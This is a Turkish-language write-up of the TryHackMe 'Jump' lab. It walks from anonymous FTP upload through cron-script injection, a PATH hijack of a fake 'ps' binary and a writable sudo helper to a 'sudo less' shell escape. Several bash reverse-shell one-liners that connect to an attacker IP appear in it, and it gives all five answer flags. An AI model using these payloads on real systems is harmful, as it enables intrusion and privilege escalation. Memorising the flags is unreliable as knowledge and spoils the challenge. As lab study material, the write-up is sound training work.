# Jump | TryHackMe Writeup
## Giriş

Jump makinesine başlarken ismin ("Jump") boşuna olmadığını çok geçmeden anladım. Klasik "bir foothold al, root ol bitsin" makinelerinden değil bu. Burada tam **5 farklı kullanıcı arasında zıplayarak** ilerliyoruz: recon_user → dev_user → monitor_user → ops_user → root. Her adımda ayrı bir yanlış konfigürasyon, ayrı bir ders var. Bu yüzden writeup da biraz uzun oldu ama elimden geldiğince her adımı, neden o adımı denediğimi ve nerede takıldığımı da yazdım, sadece "şu komutu çalıştır, bu geldi" şeklinde geçmek istemedim.

---

## Recon

Her zamanki gibi ilk iş kapsamlı bir nmap taraması:

```bash
nmap -sS -A -p- 10.113.131.57
```

Bu tarama biraz zaman aldı ama sonuç net geldi:

Sadece iki port açık: **21 (FTP)** ve **22 (SSH)**. SSH'da kimlik bilgim olmadığı için şimdilik boş, orası bize sonradan lazım olabilir belki ama şu an için tek somut giriş kapım FTP.

Nmap'in kendi `ftp-anon` scripti zaten gözüme sokarcasına söylüyor: **Anonymous FTP login allowed**. Üstüne bir de `incoming` klasörünün izinlerine bakınca:

```
drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
```

`drwxrwxrwx` yani **herkes yazabiliyor**. Bunu görünce içimden "tamam, giriş noktası büyük ihtimalle burası" dedim. Anonymous + herkese açık yazma izni olan bir klasör görünce pentester refleksi hemen "buraya bir şey bırakabilir miyim, biri onu okuyor/çalıştırıyor mu" sorusunu sormak oluyor.

<img width="1143" height="702" alt="nmap çıktı" src="https://github.com/user-attachments/assets/6925c96f-1c80-44e0-95d0-4148742aa065" />

## Enumeration

FTP'ye bağlandım:

```bash
ftp 10.113.131.57
```

Kullanıcı adı olarak `anonymous` yazdım, şifre kısmında da genelde boş geçilir ya da herhangi bir e-posta yazılabilir, ben direkt Enter'a bastım ve içeri girdim (230 kodu geldi, yani başarılı giriş).

İçeride iki klasör vardı: `incoming` ve `pub`. Önce `pub`'a girip neler olduğuna baktım:

```bash
ftp> cd pub
ftp> ls
```

Burada bir `README.txt` gördüm, direkt kendi makineme çektim:

```bash
ftp> get README.txt
```
<img width="1275" height="521" alt="ftp" src="https://github.com/user-attachments/assets/6a0ed7ca-3ba6-4261-8796-d6fa09122606" />

İçeriği şuydu:

<img width="519" height="116" alt="Readme" src="https://github.com/user-attachments/assets/ed421b74-c966-4c53-8385-dff727a8424f" />

Bu satırları okuyunca kafamda net bir resim oluştu: **`incoming/` klasörüne bir şey bırakırsam, sunucu tarafında (muhtemelen bir cron job ya da watcher script) bu dosyayı otomatik olarak işliyor.** "Invalid formats are ignored" kısmı da bana şunu söylüyor: format önemli, muhtemelen bir shell script veya belirli bir uzantı bekleniyor. Bu tarz "otomatik işlenen dosya" senaryoları genelde CTF'lerde reverse shell tetiklemek için tasarlanır, ben de direkt o yola gittim.


## Exploitation

Mantığım şuydu: eğer bırakılan dosyalar bash ile çalıştırılıyorsa, klasik bir bash reverse shell one-liner'ı işe yarar.

Kendi makinemde `shell.sh` adında bir dosya oluşturdum:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.154.242/4444 0>&1
```

Sonra tekrar FTP'ye bağlanıp bu sefer `incoming` klasörüne girdim ve dosyayı yükledim:

```bash
ftp> cd incoming
ftp> put shell.sh
```
<img width="1277" height="209" alt="put" src="https://github.com/user-attachments/assets/1ee7cb29-eeb6-472f-ae50-666518d65071" />

Aynı anda başka bir terminalde dinlemeye geçtim:

```bash
nc -nvlp 4444
```
<img width="811" height="131" alt="shell" src="https://github.com/user-attachments/assets/efb7b760-70e0-406c-a245-2be447b267df" />

Bir süre bekledim ve arkadaki otomatik işlem `shell.sh`'ı bash ile çalıştırdı. Netcat tarafında bağlantı düştü:

```
recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

İlk foothold tamamdı, `recon_user` olarak sistemdeydim. Ev dizinine baktım:

```
recon_user@tryhackme-2404:~$ ls
flag.txt
shell.sh
```
<img width="820" height="216" alt="flag1" src="https://github.com/user-attachments/assets/0bbc846a-b7d4-41cc-acc6-d1100f2ea9a3" />

**SORU 1: recon_user'ın ana dizininde bulunan bayrak nedir?**

**FLAG1:** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`

## Enumeration #2

Foothold aldıktan sonra hep aynı rutini izlerim: `id`, `groups`, `sudo -l`, sonra sistemde biraz gezinmek.

```
recon_user@tryhackme-2404:~$ groups
recon_user devops dev_user
```

Burada dikkatimi çeken şey şu: `recon_user` sadece kendi grubunda değil, aynı zamanda **`dev_user`** ve **`devops`** gruplarının da üyesi. Normalde bir kullanıcı sadece kendi ismiyle aynı gruba üye olur, burada fazladan iki grup daha var - bu şu demek: recon_user olarak, dev_user'a ait bazı dosyalara da (grup izni sayesinde) erişimim ya da yazma hakkım olabilir.

`sudo -l` denedim ama:

```
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

Şifre olmadan sudo çalışmıyor, tamam bu yol şimdilik kapalı, `/etc/group` dosyasına bakayım dedim, tüm kullanıcı-grup haritasını görmek için:

```
recon_user@tryhackme-2404:/opt$ cat /etc/group
```

Uzun bir çıktıydı, önemli kısımlarını ayıkladım:

```
recon_user:x:1001:
dev_user:x:1002:recon_user
monitor_user:x:1003:
ops_user:x:1004:
devops:x:1005:recon_user,dev_user
```

Sistemde `recon_user`, `dev_user`, `monitor_user`, `ops_user` diye ayrı kullanıcılar var ve isimlerden de tahmin edebileceğimiz gibi muhtemelen bu makinede zincirleme bir yetki yükseltme senaryosu kurulmuş: recon → dev → monitor → ops → root.

`/opt` dizinine baktım çünkü genelde "iş" script'leri, deploy araçları buralarda durur:

```
recon_user@tryhackme-2404:/opt$ ls
app
dev
recon
```

Üç klasör var: `app`, `dev`, `recon`. Sırayla içlerine girip izinlere baktım. `/opt/dev` altında `backup.sh` diye bir dosya vardı ve grup izinleri sayesinde bu dosyaya **yazabildiğimi** gördüm. Bu tarz `backup.sh` isimli script'ler genelde cron ile belirli aralıklarla ya da bir servis tarafından tetiklenerek çalıştırılır - yani tetiklenmesini bekleyebileceğim bir dosya.

## Privesc #1 - recon_user'dan dev_user'a

 `backup.sh` dosyasının sonuna bir reverse shell satırı ekleyeceğim, dosya root ya da dev_user tarafından her ne zaman tetiklenirse tetiklensin, o an bana bir shell dönecek.

```bash
echo 'bash -i >& /dev/tcp/192.168.154.242/4445 0>&1' >> /opt/dev/backup.sh
```

Dikkat ettiğim nokta: `>>` kullandım, yani dosyanın **sonuna ekledim**, üzerine yazmadım (`>`). Var olan script'in mantığını bozmak istemedim, sadece kendi satırımı ekleyip aradan sıyrılmak istedim - bu hem daha az fark edilir hem de script zaten ne yapıyorsa onu da yapmaya devam eder.

Kendi tarafımda ikinci bir dinleyici açtım:

```bash
nc -nlvp 4445
```
<img width="667" height="124" alt="shell2" src="https://github.com/user-attachments/assets/e5fc5246-30f6-49d6-afb0-0363fb5fda29" />

Ve bekledim. Bu sefer biraz daha uzun sürdü, muhtemelen bu script'i tetikleyen zamanlayıcı `incoming` klasörü kadar sık çalışmıyordu. Ama sonunda bağlantı düştü:

```
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
```

`dev_user` oldum. Ev dizinindeki flag'i aldım:

```
dev_user@tryhackme-2404:~$ cat flag.txt
```

**SORU 2: dev_user'ın ana dizininde bulunan bayrak nedir?**

**FLAG2:** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`

<img width="600" height="276" alt="flag2" src="https://github.com/user-attachments/assets/ee26e06a-a440-4308-ae0e-11c3ec3a706c" />

## Enumeration #3 - Sıradaki: monitor_user

`dev_user` olarak tekrar sistemde gezinmeye başladım, özellikle `/opt/recon` ve `/opt/dev` klasörlerine daha dikkatli baktım çünkü artık dev_user olarak bu klasörlerde farklı izinlerim/görüşlerim olabilirdi.

`/opt/recon/process.sh` dosyasının içeriğine baktığımda önemli bir şey gördüm: bu script **root sahipliğinde** çalışıyor ve `/srv/ftp/incoming/*` altındaki (yani bizim ilk foothold'u aldığımız FTP incoming klasörüyle aynı ya da bağlantılı bir yer) her dosyayı **bash ile çalıştırıp sonra siliyor**. Yani ilk aşamada bizim shell.sh'ımızı çalıştıran mekanizma aslında bu tarz bir script'miş, root yetkisiyle çalışıyormuş ama biz o zaman recon_user olarak düşmüştük çünkü muhtemelen dosya kendi kullanıcı context'inde ya da bir alt-süreç olarak icra ediliyordu.

Bu bilgi kafamda "buradaki otomasyon mekanizmalarını script isimlerinden/PATH'lerinden hijack edebilirim" fikrini oluşturdu. `/opt/dev/bin` dizinine baktım:

```
dev_user@tryhackme-2404:/opt/dev/bin$ ls -la
```

İçeride `ps` diye bir dosya vardı. `ps` normalde `/usr/bin/ps` gibi standart bir yerde bulunması gereken bir sistem komutudur ama burada `/opt/dev/bin` altında ayrı bir kopyası/versiyonu duruyordu. Bunun anlamı şuydu: eğer bu klasör, `monitor_user`'ın (ya da onun adına çalışan bir servisin/cron'un) PATH değişkeninde `/usr/bin`'den **önce** geliyorsa, `ps` komutu çağrıldığında gerçek sistem `ps`'i değil buradaki dosya çalıştırılır. Bu klasik bir **PATH hijack / binary planting** senaryosu.

## Privesc #2 - dev_user'dan monitor_user'a

Yazma iznim olduğu için `/opt/dev/bin/ps` dosyasının üzerine kendi payload'ımı yazdım (bu sefer `>` kullandım çünkü zaten sahte bir dosya, orijinal `ps` mantığını korumaya gerek yok, doğrudan reverse shell tetiklemek istiyorum):

```bash
cd /opt/dev/bin
echo 'bash -i >& /dev/tcp/192.168.154.242/1339 0>&1' > ps
chmod +x ps
```
Dinleyiciyi açtım:

```bash
nc -nlvp 1339
```
<img width="663" height="162" alt="shell3" src="https://github.com/user-attachments/assets/e9cb2ad6-76e1-4ae2-b96f-fd779e26e322" />

Bir süre sonra `monitor_user` yetkisiyle shell düştü:

```
monitor_user@tryhackme-2404:~$ id
uid=1003(monitor_user) gid=1003(monitor_user)
```

Ev dizinindeki flag:

```
monitor_user@tryhackme-2404:~$ cat flag.txt
```

**SORU 3: monitor_user'ın ana dizininde bulunan bayrak nedir?**

**FLAG3:** `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`


## Privesc #3 - monitor_user'dan ops_user'a

Artık alışkanlık haline geldi: yeni bir kullanıcı olduğumda ilk iş `sudo -l`.

<img width="840" height="191" alt="shell3densonra" src="https://github.com/user-attachments/assets/ddc97737-1a1d-4eb6-85f0-9b6cfc7b1bcb" />

Burada net bir kural var: `monitor_user`, **şifre girmeden** `ops_user` yetkisiyle `/usr/local/bin/deploy.sh` dosyasını çalıştırabiliyor. İlk düşüncem "deploy script'ini direkt çalıştırıp ne yaptığına bakayım" oldu, ama tabii asıl amacım script'i kullanarak `ops_user` shell'i almak.

`deploy.sh` dosyasının içeriğine baktığımda başka bir dosyayı (`deploy_helper.sh`) çağırdığını gördüm, ve bu helper dosyası bana yazılabilir durumdaydı. Yani `deploy.sh`'ı direkt değiştirmeme gerek yoktu (belki root/ops_user tarafında checksum ya da izin kontrolü olabilirdi diye düşündüm), onun yerine çağırdığı helper'a payload eklemek daha temiz bir yoldu.

Önce dinleyiciyi hazırladım:

```bash
nc -lvnp 1340 -k
```

Sonra `deploy_helper.sh`'a satırımı ekledim:

```bash
echo 'bash -i >& /dev/tcp/192.168.154.242/1340 0>&1' >> deploy_helper.sh
```

Ve asıl tetikleyici komutu çalıştırdım:

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

`deploy.sh` çalışınca içeride `deploy_helper.sh`'ı da çağırdı, benim eklediğim satır tetiklendi ve `ops_user` yetkisiyle shell bağlantısı geldi:

<img width="641" height="118" alt="shell4" src="https://github.com/user-attachments/assets/2540f5eb-1326-49db-bdc8-03a2f525f9fb" />

```
ops_user@tryhackme-2404:~$ id
uid=1004(ops_user) gid=1004(ops_user)
```

```
ops_user@tryhackme-2404:~$ cat flag.txt

```

**SORU 4: ops_user'ın ana dizininde bulunan bayrak nedir?**

**FLAG4:** `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`

<img width="803" height="362" alt="flag4" src="https://github.com/user-attachments/assets/54a41de7-7190-4b44-bd44-c6a4bb590b98" />


## Root'a Geçiş

`ops_user` olarak tekrar `sudo -l` çalıştırdım,:

<img width="949" height="148" alt="shell4den sonra" src="https://github.com/user-attachments/assets/6b31bc6f-1daf-4f08-8e7d-4c75e75a26c2" />

Bunu görünce içim rahatladı çünkü mantık şu: `less` bir pager, dosya görüntülerken içinden `!komut` yazarak shell'e komut geçirebiliyorsun, ve `!/bin/bash` yazarsan direkt bir bash shell'i düşüyor - `less` hangi yetkiyle çalışıyorsa o shell de o yetkiyle açılıyor.

<img width="901" height="386" alt="shell4densonra1" src="https://github.com/user-attachments/assets/ae9e1a50-e4f6-4bc7-8f0f-d900de9fe549" />

Denedim:

```bash
sudo less /etc/hosts
```

O ekrandayken:

```
!/bin/bash
```

yazıp Enter'a bastım ve root oldum:

```
root@tryhackme-2404:~# id
uid=0(root) gid=0(root)
```

Root dizinindeki flag'i aldım:

```
root@tryhackme-2404:~# cat root.txt
```

**SORU 5: What is the flag found in the root user's home directory?**

**FLAG5:** `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`

<img width="660" height="357" alt="flag5" src="https://github.com/user-attachments/assets/8c20d84e-0a48-4c0c-9d41-c834a611c399" />
